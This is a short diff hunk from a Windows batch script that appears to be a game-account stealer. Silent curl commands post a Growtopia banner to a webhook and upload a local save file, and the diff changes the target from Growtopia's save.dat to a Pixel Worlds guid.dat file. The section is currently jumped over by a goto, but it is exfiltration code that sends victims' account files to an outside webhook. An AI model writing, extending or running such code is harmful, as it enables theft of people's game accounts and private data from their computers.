@@ -238,7 +238,7 @@ goto skipminecraft
 :: ---------------------------------------------------------
 goto skipgrowtopia
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- GROWTOPIA -```\"}"  %webhook%
-	curl --silent --output /dev/null -F save.dat=@"%localappdata%\Growtopia\save.dat" %webhook%
+	curl --silent --output /dev/null -F save.dat=@"%localappdata%\Kukouri\Pixel Worlds\devtodev\unknown\guid.dat" %webhook%
 	
 	timeout /t 2 /nobreak > NUL
 :skipgrowtopia
